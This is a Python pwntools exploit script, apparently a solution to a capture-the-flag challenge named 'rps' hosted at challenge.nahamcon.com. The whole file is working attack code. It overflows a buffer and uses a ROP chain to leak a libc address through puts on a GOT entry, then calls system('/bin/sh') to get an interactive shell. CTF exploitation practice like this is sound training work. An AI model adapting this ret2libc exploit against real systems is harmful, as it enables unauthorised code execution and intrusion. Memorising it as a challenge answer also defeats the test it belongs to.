#!/usr/bin/env python3

from pwn import *

exe = ELF("./rps")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

#r = conn()
r = remote("challenge.nahamcon.com", 30509)

def start():
    r.recv()
    r.sendline('y')

def send_rock():
    r.recv()
    r.sendline("1")

def repeat(msg):
    r.recv()
    r.send(msg)

def send_payload(payload, f=0):
    r.recv()
    r.sendline(payload)

    r.recv()
    if(f):
        r.sendline("yes")
    else:
        r.sendline("no")

def main():
    start()
    send_rock()
    repeat(b"yes\n"+ p32(0) + p64(0)*2 + p8(0x8))

    pause()
    
    pop_rdi = 0x0000000000401513
    ret = 0x0401452
    rps = 0x0401313

    payload  = b"M"*20
    payload += p64(pop_rdi)
    payload += p64(exe.got['memset'])
    payload += p64(exe.plt['puts'])
    payload += p64(rps)

    send_payload(payload)

    leak = r.recvuntil(p8(0x7f))[-6::]
    libc.address = u64(leak + p16(0)) - 0x18eaf0
    log.warn("Libc base @ 0x%x", libc.address)
    
    payload = b"M"*20
    payload += p64(pop_rdi)
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += p64(ret)
    payload += p64(libc.sym['system'])

    send_payload(payload)

    r.interactive()


if __name__ == "__main__":
    main()
